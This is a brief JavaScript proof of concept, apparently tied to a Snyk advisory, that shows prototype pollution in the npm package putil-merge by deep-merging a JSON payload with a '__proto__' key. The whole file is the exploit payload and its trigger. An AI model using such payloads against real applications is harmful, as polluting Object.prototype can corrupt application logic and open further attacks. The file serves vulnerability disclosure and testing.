//https://security.snyk.io/vuln/SNYK-JS-PUTILMERGE-1317077
const putil_merge = require("putil-merge");
const payload = JSON.parse('{"__proto__":{"polluted":"yes"}}');
var obj = {};

putil_merge(obj, payload, { deep: true});
//putil_merge(obj, payload, { deep: true, descriptor: true });
